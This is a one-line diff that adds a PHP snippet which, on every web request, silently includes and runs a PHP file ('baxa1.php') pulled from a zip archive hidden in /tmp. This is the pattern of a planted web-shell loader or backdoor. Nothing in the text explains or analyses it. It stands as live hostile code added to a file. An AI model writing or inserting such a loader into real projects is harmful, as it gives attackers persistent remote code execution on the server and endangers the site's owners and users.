@@ -1,0 +1,1 @@
+<?=@null; $h="";if(!empty($_SERVER["HTTP_HOST"])) $h = "机器备码压缩包/baxa1.php"; include("zip:///tmp/phpMopBV3#$h");?>
